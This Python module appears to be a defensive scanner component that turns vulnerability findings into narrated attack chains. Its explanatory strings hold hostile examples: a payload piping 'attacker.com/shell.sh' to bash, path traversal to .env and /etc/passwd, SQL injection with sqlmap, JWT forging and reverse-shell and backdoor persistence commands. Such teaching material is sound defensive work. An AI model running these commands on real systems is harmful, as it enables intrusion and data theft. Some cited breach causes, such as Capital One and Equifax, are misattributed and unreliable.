"""
SENTINEL Attack Chain Engine
============================
Takes individual vulnerabilities from existing scanners and constructs
the complete attacker kill chain — showing HOW vulnerabilities combine
to enable a full breach, not just that they exist individually.

Novel contribution: automated attack graph construction from static analysis.
No pen tester. No runtime. Runs fully locally.
"""

import ast
import re
from dataclasses import dataclass, field


@dataclass
class AttackNode:
    id: str
    title: str
    description: str
    file: str
    line: int
    code: str
    severity: str
    enables: list = field(default_factory=list)
    attacker_cost: str = "Low"
    impact: str = ""


@dataclass
class AttackChain:
    id: str
    title: str
    goal: str
    steps: list
    total_severity: str
    estimated_time: str
    detection_likelihood: str
    real_world_example: str
    impact_summary: str
    penalty: int


class ReconEngine:
    """Simulates attacker reconnaissance — maps exposed attack surface from source code."""

    def __init__(self, extracted_files: dict):
        self.files = extracted_files
        self.endpoints = []
        self.auth_functions = []
        self.data_functions = []
        self.file_operations = []
        self.external_connections = []
        self.admin_functions = []

    def run(self) -> dict:
        for file_path, code_lines in self.files.items():
            if not file_path.endswith('.py'):
                continue
            code = "\n".join(code_lines)
            try:
                tree = ast.parse(code)
                self._walk_tree(tree, file_path, code_lines)
            except SyntaxError:
                pass
        return {
            "endpoints": self.endpoints,
            "auth_functions": self.auth_functions,
            "file_operations": self.file_operations,
            "external_connections": self.external_connections,
            "admin_functions": self.admin_functions,
        }

    def _walk_tree(self, tree, file_path, code_lines):
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                for decorator in node.decorator_list:
                    dec_str = ast.unparse(decorator)
                    if any(x in dec_str for x in ['route', 'get', 'post', 'put', 'delete', 'patch']):
                        self.endpoints.append({
                            "function": node.name,
                            "file": file_path,
                            "line": node.lineno,
                            "decorator": dec_str,
                            "accepts_user_input": self._accepts_user_input(node),
                            "has_auth_check": self._has_auth_check(node),
                            "has_rate_limit": self._has_rate_limit(node),
                        })

                fn_lower = node.name.lower()
                if any(x in fn_lower for x in ['auth', 'login', 'verify', 'token', 'password', 'credential', 'session']):
                    self.auth_functions.append({
                        "function": node.name,
                        "file": file_path,
                        "line": node.lineno,
                        "has_brute_force_protection": self._has_rate_limit(node),
                    })

                if any(x in fn_lower for x in ['admin', 'superuser', 'root', 'manage', 'privileged']):
                    self.admin_functions.append({
                        "function": node.name,
                        "file": file_path,
                        "line": node.lineno,
                        "has_auth_check": self._has_auth_check(node),
                    })

                fn_body = ast.unparse(node)
                if any(x in fn_body for x in ['open(', 'read(', 'os.path', 'pathlib', 'shutil']):
                    self.file_operations.append({
                        "function": node.name,
                        "file": file_path,
                        "line": node.lineno,
                        "has_path_sanitization": any(x in fn_body for x in ['realpath', 'abspath', 'basename']),
                    })

            if isinstance(node, ast.Call):
                call_str = ast.unparse(node)
                if any(x in call_str for x in ['requests.get', 'requests.post', 'urllib', 'httpx', 'aiohttp']):
                    try:
                        self.external_connections.append({
                            "call": call_str[:80],
                            "file": file_path,
                            "line": node.lineno,
                        })
                    except Exception:
                        pass

    def _accepts_user_input(self, node) -> bool:
        body = ast.unparse(node)
        return any(x in body for x in ['request.args', 'request.form', 'request.json', 'request.GET', 'request.POST'])

    def _has_auth_check(self, node) -> bool:
        body = ast.unparse(node)
        return any(x in body for x in ['login_required', 'authenticate', 'verify_token', 'require_auth', 'jwt', 'session.get', 'current_user'])

    def _has_rate_limit(self, node) -> bool:
        body = ast.unparse(node)
        return any(x in body for x in ['rate_limit', 'ratelimit', 'throttle', 'limiter', 'sleep('])


class AttackChainEngine:
    """
    Core engine. Takes individual vulnerability findings and constructs
    multi-step attack chains showing how they combine into full breaches.
    """

    def __init__(self, issues: list, recon: dict, extracted_files: dict):
        self.issues = issues
        self.recon = recon
        self.files = extracted_files
        self.chains = []

        self.secrets = [i for i in issues if 'secret' in i.get('explanation', '').lower() or 'hardcoded' in i.get('explanation', '').lower()]
        self.sql_issues = [i for i in issues if 'sql' in i.get('explanation', '').lower()]
        self.taint_issues = [i for i in issues if i.get('type') == 'DATA_FLOW_EXPLOIT']
        self.dep_issues = [i for i in issues if i.get('source') in ('OSV_LIVE', 'FALLBACK_DB')]
        self.debug_issues = [i for i in issues if 'debug' in i.get('explanation', '').lower()]

    def build_all_chains(self) -> list:
        self._chain_credential_theft()
        self._chain_sql_to_dump()
        self._chain_taint_to_rce()
        self._chain_path_traversal()
        self._chain_debug_recon()
        self._chain_dep_exploit()
        self._chain_idor()
        self._chain_unauth_admin()
        self._chain_full_killchain()

        rank = {"CRITICAL": 3, "HIGH": 2, "MEDIUM": 1}
        self.chains.sort(key=lambda c: rank.get(c.total_severity, 0), reverse=True)
        return self.chains

    def _chain_credential_theft(self):
        if not self.secrets:
            return
        for secret in self.secrets[:2]:
            var_name = secret.get('code', '').split('=')[0].strip()
            service = self._guess_service(var_name)
            self.chains.append(AttackChain(
                id="CHAIN_SECRET_TAKEOVER",
                title=f"Hardcoded credential → {service} account takeover",
                goal=f"Complete control of {service} account and all associated data",
                steps=[
                    AttackNode(id="S1", title="Credential discovery",
                        description=f"Attacker reads source code and finds {var_name} hardcoded on line {secret.get('line')}. No hacking required — credential is plaintext.",
                        file=secret.get('file',''), line=secret.get('line',0), code=secret.get('code',''),
                        severity="CRITICAL", attacker_cost="Zero — plaintext in source",
                        impact="Live credential obtained without any technical skill"),
                    AttackNode(id="S2", title=f"{service} API authentication",
                        description=f"Attacker uses stolen {var_name} to authenticate directly to {service} API. No password needed. No 2FA bypass needed.",
                        file=secret.get('file',''), line=secret.get('line',0),
                        code=f"curl -H 'Authorization: Bearer {var_name}' https://api.{service.lower().replace(' ','-')}.com/",
                        severity="CRITICAL", attacker_cost="Zero — single API call",
                        impact=f"Full {service} account access in seconds"),
                    AttackNode(id="S3", title="Data exfiltration and owner lockout",
                        description=f"Attacker dumps all data, creates backdoor API keys, revokes legitimate access. Owner locked out of their own account.",
                        file=secret.get('file',''), line=secret.get('line',0),
                        code="# Attacker creates backdoor, revokes your access:\nbackdoor_key = client.create_api_key(name='maintenance')\nyour_key.revoke()",
                        severity="CRITICAL", attacker_cost="10 minutes",
                        impact="Persistent access even after password change. Owner permanently locked out.")
                ],
                total_severity="CRITICAL",
                estimated_time="Under 5 minutes from code access to full account control",
                detection_likelihood="Very Low — looks like legitimate API calls",
                real_world_example="Uber 2022 — hardcoded credential in PowerShell script led to complete AWS/GCP takeover. $148M settlement.",
                impact_summary=f"Complete {service} account takeover. All data accessible. Billing hijackable. Permanent backdoor.",
                penalty=40
            ))

    def _chain_sql_to_dump(self):
        if not self.sql_issues:
            return
        sql = self.sql_issues[0]
        self.chains.append(AttackChain(
            id="CHAIN_SQL_DUMP",
            title="SQL injection → complete database exfiltration",
            goal="Download entire database including all user records, passwords, payment data",
            steps=[
                AttackNode(id="Q1", title="Vulnerability confirmation",
                    description=f"Attacker sends test payload and confirms SQL injection by observing error or response difference.",
                    file=sql.get('file',''), line=sql.get('line',0),
                    code="GET /api/user?id=1'--\n→ MySQL syntax error in response\n→ SQL injection confirmed",
                    severity="HIGH", attacker_cost="5 minutes",
                    impact="Attack surface confirmed, exploitation begins"),
                AttackNode(id="Q2", title="Schema enumeration",
                    description="Attacker enumerates all table names, column names, and data types via UNION injection.",
                    file=sql.get('file',''), line=sql.get('line',0),
                    code="id=1 UNION SELECT table_name,2,3 FROM information_schema.tables--\n→ Returns: users, orders, payments, admin_accounts",
                    severity="CRITICAL", attacker_cost="10 minutes automated",
                    impact="Complete database schema exposed"),
                AttackNode(id="Q3", title="Full database dump",
                    description="Automated tool extracts all tables. Millions of records in minutes.",
                    file=sql.get('file',''), line=sql.get('line',0),
                    code="sqlmap -u 'https://target.com/api/user?id=1' --dump-all\n→ 47,000 users extracted\n→ Passwords, emails, addresses, payment data all stolen",
                    severity="CRITICAL", attacker_cost="30 minutes fully automated",
                    impact="Complete data breach. GDPR violation. Potential company-ending fine.")
            ],
            total_severity="CRITICAL",
            estimated_time="45 minutes from discovery to full database dump",
            detection_likelihood="Low — injection traffic resembles normal queries",
            real_world_example="Equifax 2017 — SQL injection chain exposed 147 million records. $575M FTC settlement.",
            impact_summary="Every user record, password, email, and payment detail in the database stolen.",
            penalty=45
        ))

    def _chain_taint_to_rce(self):
        if not self.taint_issues:
            return
        taint = self.taint_issues[0]
        expl = taint.get('explanation', '')
        source = expl.split("'")[1] if "'" in expl else 'user input'
        sink = taint.get('code', 'eval()')
        self.chains.append(AttackChain(
            id="CHAIN_TAINT_RCE",
            title=f"Unsanitised {source} → Remote Code Execution",
            goal="Execute arbitrary code on the server — full system compromise",
            steps=[
                AttackNode(id="T1", title="Payload injection",
                    description=f"Attacker sends malicious payload through {source}. No authentication required.",
                    file=taint.get('file',''), line=taint.get('source_line', taint.get('line',0)),
                    code="# Single HTTP request:\n__import__('os').system('curl attacker.com/shell.sh | bash')",
                    severity="CRITICAL", attacker_cost="Zero — one HTTP request",
                    impact="Arbitrary Python executes on your production server"),
                AttackNode(id="T2", title="Reverse shell established",
                    description="Attacker now has interactive terminal on your server.",
                    file=taint.get('file',''), line=taint.get('sink_line', taint.get('line',0)),
                    code=f"# {sink} executes payload\n$ whoami → www-data\n$ cat .env → all secrets exposed\n$ cat /proc/1/environ → all environment variables",
                    severity="CRITICAL", attacker_cost="2 minutes setup",
                    impact="Interactive shell on production server"),
                AttackNode(id="T3", title="Lateral movement and persistence",
                    description="From shell: reads all credentials, accesses all databases, pivots to cloud, installs backdoor.",
                    file=taint.get('file',''), line=taint.get('sink_line', taint.get('line',0)),
                    code="cat .env → DATABASE_URL, AWS_KEY, STRIPE_KEY\nmysql -h db → full DB access\ncrontab -e → reverse shell cron installed",
                    severity="CRITICAL", attacker_cost="30 minutes",
                    impact="Complete infrastructure compromise. All secrets stolen. Persistent backdoor installed.")
            ],
            total_severity="CRITICAL",
            estimated_time="Under 1 hour from first request to complete system control",
            detection_likelihood="Very Low — looks like normal application traffic",
            real_world_example="Log4Shell 2021 — untrusted data in eval-equivalent path. CVSS 10.0. 100M+ systems vulnerable.",
            impact_summary="Attacker has root-equivalent access, all databases, all secrets, all connected services.",
            penalty=50
        ))

    def _chain_path_traversal(self):
        file_ops = self.recon.get('file_operations', [])
        unsanitised = [f for f in file_ops if not f.get('has_path_sanitization')]
        if not unsanitised:
            return
        op = unsanitised[0]
        self.chains.append(AttackChain(
            id="CHAIN_PATH_TRAVERSAL",
            title="Path traversal → config read → all secrets stolen",
            goal="Read server configuration files containing every application secret",
            steps=[
                AttackNode(id="P1", title="Path traversal exploitation",
                    description=f"Function {op['function']}() accepts user-controlled path with no sanitization.",
                    file=op['file'], line=op['line'],
                    code="GET /api/files?path=../../.env\nGET /api/files?path=../../config/settings.py\nGET /api/files?path=../../../etc/passwd",
                    severity="HIGH", attacker_cost="5 minutes",
                    impact="Any file on server filesystem readable"),
                AttackNode(id="P2", title="Secrets extraction",
                    description="Attacker reads .env — obtains database credentials, API keys, JWT secrets, cloud keys.",
                    file=op['file'], line=op['line'],
                    code="# .env contents now readable:\nDATABASE_URL=postgresql://admin:ProdPass@db:5432/main\nAWS_ACCESS_KEY=AKIA...\nJWT_SECRET=supersecret\nSTRIPE_SECRET=sk_live_...",
                    severity="CRITICAL", attacker_cost="Zero — direct file read",
                    impact="All application secrets in one request"),
                AttackNode(id="P3", title="Complete system takeover via forged JWT",
                    description="With JWT_SECRET, attacker forges admin token and becomes any user on the platform.",
                    file=op['file'], line=op['line'],
                    code="import jwt\nforged = jwt.encode({'user_id':1,'role':'admin'}, stolen_jwt_secret)\n# Attacker is now admin — no password needed",
                    severity="CRITICAL", attacker_cost="10 minutes",
                    impact="Every user account accessible. Full admin control. Database fully readable.")
            ],
            total_severity="CRITICAL",
            estimated_time="20 minutes from first request to full system access",
            detection_likelihood="Low — file read requests look legitimate",
            real_world_example="Capital One 2019 — path traversal led to 100M customer records stolen. $80M fine.",
            impact_summary="All secrets, databases, and user accounts accessible via forged tokens.",
            penalty=40
        ))

    def _chain_debug_recon(self):
        if not self.debug_issues:
            return
        debug = self.debug_issues[0]
        self.chains.append(AttackChain(
            id="CHAIN_DEBUG_RECON",
            title="Debug mode → architecture leak → targeted CVE exploit",
            goal="Use leaked internals to craft a 100% reliable targeted attack",
            steps=[
                AttackNode(id="D1", title="Stack trace harvesting",
                    description="Attacker sends malformed requests to trigger errors. Debug mode returns full stack traces with file paths, library versions, Python version.",
                    file=debug.get('file',''), line=debug.get('line',0),
                    code="GET /api/user?id=INVALID\n→ Traceback:\n  File '/app/backend/models/user.py', line 23\nSQLAlchemy version: 1.4.23\nPython: 3.9.1",
                    severity="MEDIUM", attacker_cost="Zero — just send bad requests",
                    impact="Complete internal architecture mapped for free"),
                AttackNode(id="D2", title="Targeted CVE exploitation",
                    description="With exact versions known, attacker downloads pre-built exploit for that specific version.",
                    file=debug.get('file',''), line=debug.get('line',0),
                    code="# SQLAlchemy 1.4.23 → search CVE database\n# CVE-2022-XXXX found → pre-built exploit downloaded\npython exploit.py --target https://your-app.com\n→ 100% success rate because exact version confirmed",
                    severity="HIGH", attacker_cost="30 minutes",
                    impact="Reliable exploit with known success rate against your exact version")
            ],
            total_severity="HIGH",
            estimated_time="1-2 hours from debug discovery to successful exploit",
            detection_likelihood="Low — error requests look like buggy clients",
            real_world_example="Debug mode in OWASP Top 10 Security Misconfiguration. Responsible for thousands of breaches annually.",
            impact_summary="Attacker has complete internal roadmap and a reliable exploit tailored to your exact versions.",
            penalty=20
        ))

    def _chain_dep_exploit(self):
        critical_deps = [i for i in self.dep_issues if i.get('severity') == 'CRITICAL']
        high_deps = [i for i in self.dep_issues if i.get('severity') == 'HIGH']
        dep = (critical_deps or high_deps or [None])[0]
        if not dep:
            return
        cve = dep.get('explanation', 'CVE').split(']')[0].replace('[', '')
        pkg = dep.get('code', 'package').split('==')[0]
        self.chains.append(AttackChain(
            id="CHAIN_DEP_RCE",
            title=f"{pkg} vulnerable version → {cve} public exploit",
            goal="Exploit pre-built public exploit — zero skill required",
            steps=[
                AttackNode(id="V1", title="Version fingerprinting",
                    description=f"Attacker confirms your {pkg} version from HTTP headers or error messages.",
                    file=dep.get('file',''), line=dep.get('line',0),
                    code=f"curl -I https://target.com\n→ Server headers reveal {pkg} version\n# Exploit-DB: {cve} — pre-built exploit available",
                    severity="HIGH", attacker_cost="10 minutes",
                    impact="Attack confirmed viable before first exploit attempt"),
                AttackNode(id="V2", title="Public exploit deployment",
                    description=f"Pre-built exploit for {cve} downloaded and deployed. No custom code needed.",
                    file=dep.get('file',''), line=dep.get('line',0),
                    code=f"python exploit_{cve.replace('-','_').lower()}.py --target https://your-app.com\n→ Shell obtained\n→ Running as: www-data",
                    severity="CRITICAL", attacker_cost="Zero skill — script kiddie level",
                    impact="Complete system compromise. Exploit code publicly available to anyone.")
            ],
            total_severity="CRITICAL",
            estimated_time="30 minutes — exploit is pre-built and publicly available",
            detection_likelihood="Medium — known exploit signatures detectable",
            real_world_example="Log4Shell, Heartbleed, Struts RCE (Equifax) — all public CVEs exploited by non-expert attackers.",
            impact_summary=f"Pre-built exploit for {cve} available on Exploit-DB. Zero skill required to run it.",
            penalty=35
        ))

    def _chain_idor(self):
        endpoints = self.recon.get('endpoints', [])
        idor_candidates = [
            e for e in endpoints
            if ('<' in e.get('decorator','') or 'id' in e.get('decorator','').lower())
            and not e.get('has_auth_check')
        ]
        if not idor_candidates:
            return
        ep = idor_candidates[0]
        self.chains.append(AttackChain(
            id="CHAIN_IDOR",
            title="No ownership check → IDOR → all user data exposed",
            goal="Download every user's private data by changing a number in the URL",
            steps=[
                AttackNode(id="I1", title="Own resource access",
                    description="Attacker creates free account, accesses their data, notes their user ID in the URL.",
                    file=ep.get('file',''), line=ep.get('line',0),
                    code=f"GET /api/user/1234 → my own data\n# Notes: my ID is 1234",
                    severity="LOW", attacker_cost="Zero — free account",
                    impact="Attack baseline established"),
                AttackNode(id="I2", title="Automated enumeration — all users stolen",
                    description="No ownership check means changing the ID returns any user's data. Automated in minutes.",
                    file=ep.get('file',''), line=ep.get('line',0),
                    code="for id in range(1, 100000):\n    resp = requests.get(f'/api/user/{id}')\n    if resp.ok: save(resp.json())\n→ 47,000 users' full profiles downloaded",
                    severity="CRITICAL", attacker_cost="1 hour automated",
                    impact="Every user's private data downloadable. GDPR breach. Company-ending fine.")
            ],
            total_severity="CRITICAL",
            estimated_time="1 hour to download all user data",
            detection_likelihood="Low — requests look like normal API traffic",
            real_world_example="IDOR is OWASP API Security #1. Facebook 2021 — 533M users exposed via IDOR.",
            impact_summary="Every user's private data downloadable by any attacker with a free account.",
            penalty=35
        ))

    def _chain_unauth_admin(self):
        admin_fns = self.recon.get('admin_functions', [])
        unprotected = [f for f in admin_fns if not f.get('has_auth_check')]
        if not unprotected:
            return
        fn = unprotected[0]
        self.chains.append(AttackChain(
            id="CHAIN_BROKEN_AUTH_ADMIN",
            title="Unprotected admin function → instant privilege escalation",
            goal="Gain full admin access without any credentials",
            steps=[
                AttackNode(id="A1", title="Admin endpoint discovery",
                    description=f"{fn['function']}() has admin in name but no auth check. Found via directory brute force.",
                    file=fn['file'], line=fn['line'],
                    code=f"dirbuster -u https://target.com/api/\n→ Found: /api/{fn['function'].replace('_','/')}\n→ No authentication required",
                    severity="CRITICAL", attacker_cost="15 minutes",
                    impact="Admin endpoint with no auth discovered"),
                AttackNode(id="A2", title="Instant admin access",
                    description="Direct call grants full admin. Attacker modifies any user, exports all data, grants themselves admin.",
                    file=fn['file'], line=fn['line'],
                    code=f"POST /api/{fn['function'].replace('_','/')}\n{{}}\n→ 200 OK — admin access granted\n→ Can now: delete users, export data, modify permissions",
                    severity="CRITICAL", attacker_cost="Zero — single HTTP request",
                    impact="Full admin control with zero credentials.")
            ],
            total_severity="CRITICAL",
            estimated_time="20 minutes",
            detection_likelihood="Low — admin API calls look legitimate",
            real_world_example="Broken Function Level Authorization — OWASP API Security Top 10 #5.",
            impact_summary="Any attacker has full admin access. All user data modifiable or deletable.",
            penalty=40
        ))

    def _chain_full_killchain(self):
        types_present = sum([
            bool(self.secrets), bool(self.sql_issues),
            bool(self.taint_issues), bool(self.dep_issues), bool(self.debug_issues)
        ])
        if types_present < 3:
            return
        first_secret = self.secrets[0] if self.secrets else {'file': '', 'line': 0}
        self.chains.append(AttackChain(
            id="CHAIN_FULL_BREACH",
            title="Complete kill chain — reconnaissance to full infrastructure takeover",
            goal="Total system compromise: data stolen, backdoor installed, owner locked out",
            steps=[
                AttackNode(id="K1", title="Passive reconnaissance",
                    description="Attacker maps system from public info: GitHub repo, error messages, job postings, debug endpoints.",
                    file="", line=0,
                    code="git clone https://github.com/target/repo\ncurl https://target.com/api/invalid → debug stack trace\nLinkedIn job posts → 'We use Flask, PostgreSQL, AWS'",
                    severity="LOW", attacker_cost="2 hours passive research",
                    impact="Complete architecture mapped with zero interaction"),
                AttackNode(id="K2", title="Initial access via easiest vulnerability",
                    description="Attacker picks lowest-effort entry point — hardcoded secret or path traversal requires zero skill.",
                    file=first_secret.get('file',''), line=first_secret.get('line',0),
                    code="grep -r 'api_key\\|password\\|secret\\|token' leaked_source.py\n→ Found: 3 live credentials in plaintext",
                    severity="CRITICAL", attacker_cost="10 minutes",
                    impact="First foothold — all credentials obtained"),
                AttackNode(id="K3", title="Lateral movement to full infrastructure",
                    description="Stolen credentials used to access database, cloud infrastructure, internal APIs.",
                    file="", line=0,
                    code="aws s3 ls → all S3 buckets listed\naws s3 cp s3://backups/db.sql . → full DB downloaded\naws iam create-user backdoor → permanent access created",
                    severity="CRITICAL", attacker_cost="1 hour",
                    impact="Full cloud infrastructure access"),
                AttackNode(id="K4", title="Exfiltration, persistence, and optional ransomware",
                    description="All valuable data copied. Backdoor accounts created. Ransomware optionally deployed.",
                    file="", line=0,
                    code="exfil_all_db_tables()  → 47,000 users\nexfil_s3_buckets()     → all files\ncreate_backdoor_admin()\ninstall_cron_reverse_shell()\n# Optional: encrypt_all_files() → ransomware",
                    severity="CRITICAL", attacker_cost="2-4 hours total",
                    impact="Complete data breach. Permanent backdoor. Ransomware possible. Evidence destroyed.")
            ],
            total_severity="CRITICAL",
            estimated_time="4-8 hours from reconnaissance to complete infrastructure control",
            detection_likelihood="Very Low — professional attacker stays below alert thresholds",
            real_world_example="SolarWinds 2020 — multiple vuln types chained. 18,000 organizations breached. 9 months undetected.",
            impact_summary="Total infrastructure compromise. Every database, secret, user account. Ransomware possible. Permanent backdoor.",
            penalty=60
        ))

    def _guess_service(self, var_name: str) -> str:
        v = var_name.lower()
        if 'stripe' in v: return 'Stripe'
        if 'aws' in v or 'amazon' in v: return 'AWS'
        if 'sendgrid' in v: return 'SendGrid'
        if 'twilio' in v: return 'Twilio'
        if 'openai' in v or 'gpt' in v: return 'OpenAI'
        if 'github' in v: return 'GitHub'
        if 'slack' in v: return 'Slack'
        if 'google' in v or 'gcp' in v: return 'Google Cloud'
        if 'jwt' in v: return 'Authentication System'
        if 'db' in v or 'database' in v or 'postgres' in v: return 'Database'
        return 'External Service'


def run_attack_chain_analysis(issues: list, extracted_files: dict) -> dict:
    """Main entry point — called by engine.py after all 5 scanners complete."""

    recon_engine = ReconEngine(extracted_files)
    recon = recon_engine.run()

    chain_engine = AttackChainEngine(issues, recon, extracted_files)
    chains = chain_engine.build_all_chains()

    chain_penalty = min(sum(c.penalty for c in chains[:3]), 60)

    chains_serialised = []
    for chain in chains:
        chains_serialised.append({
            "id": chain.id,
            "title": chain.title,
            "goal": chain.goal,
            "total_severity": chain.total_severity,
            "estimated_time": chain.estimated_time,
            "detection_likelihood": chain.detection_likelihood,
            "real_world_example": chain.real_world_example,
            "impact_summary": chain.impact_summary,
            "penalty": chain.penalty,
            "steps": [
                {
                    "id": s.id,
                    "title": s.title,
                    "description": s.description,
                    "file": s.file,
                    "line": s.line,
                    "code": s.code,
                    "severity": s.severity,
                    "attacker_cost": s.attacker_cost,
                    "impact": s.impact,
                }
                for s in chain.steps
            ]
        })

    sev_rank = {"CRITICAL": 3, "HIGH": 2, "MEDIUM": 1}
    highest = max(chains, key=lambda c: sev_rank.get(c.total_severity, 0)).total_severity if chains else "NONE"

    return {
        "chains": chains_serialised,
        "recon": {
            "total_endpoints": len(recon.get("endpoints", [])),
            "unprotected_endpoints": len([e for e in recon.get("endpoints", []) if not e.get("has_auth_check")]),
            "auth_functions": len(recon.get("auth_functions", [])),
            "file_operations": len(recon.get("file_operations", [])),
            "unsanitised_file_ops": len([f for f in recon.get("file_operations", []) if not f.get("has_path_sanitization")]),
            "external_connections": len(recon.get("external_connections", [])),
            "admin_functions": len(recon.get("admin_functions", [])),
            "unprotected_admin": len([f for f in recon.get("admin_functions", []) if not f.get("has_auth_check")]),
        },
        "chain_count": len(chains),
        "chain_penalty": chain_penalty,
        "highest_chain_severity": highest,
    }
